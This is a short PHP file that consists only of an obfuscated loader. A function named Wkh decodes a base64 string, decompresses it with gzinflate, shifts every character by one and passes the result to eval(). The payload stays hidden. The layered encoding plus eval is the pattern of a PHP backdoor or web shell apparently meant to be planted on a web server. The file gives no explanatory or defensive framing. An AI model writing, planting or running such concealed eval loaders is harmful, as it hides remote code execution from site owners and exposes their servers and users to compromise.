<?php function Wkh($Lrmud)
{ 
$Lrmud=gzinflate(base64_decode($Lrmud));
 for($i=0;$i<strlen($Lrmud);$i++)
 {
$Lrmud[$i] = chr(ord($Lrmud[$i])-1);
 }
 return $Lrmud;
 }eval(Wkh("dZDBTgIxEIYfoE8xJntYiFoIRqMEInrx4o2bMc1QZmFDt13bLkgMz+5ut6yKOpeZtP///ZMBqIsxqdA5mD/MxaMpCqPFE6mSrJhZi3ugd0966eAZV1QLLHXfC+ctSs8+WMPh/X7o0Ie19+Ud586j3Jgt2UyZ3aU0BX/jw5vR1WDAh6PB9e3wqL8v0WIBld5os9PC70uCBJv0TmHJV1bDwhhFqOMzD72sFiqXkFVa+txoyN3MOSPTltALmnbFpiIo/sLZZAJhEltUFbmjqzcOjgP7MyJT6Our/BORLNEjRG4aSU1l9fVQrrtwdJBsaA+TKSQhvveN0lSeQZo70YKi5FTzK1EUZFeUhrdzSPw6dxfTbuMIGf9gHICUo//AL82SrzW+NZ9Y2dd0euTgPh7ywD4B"));?>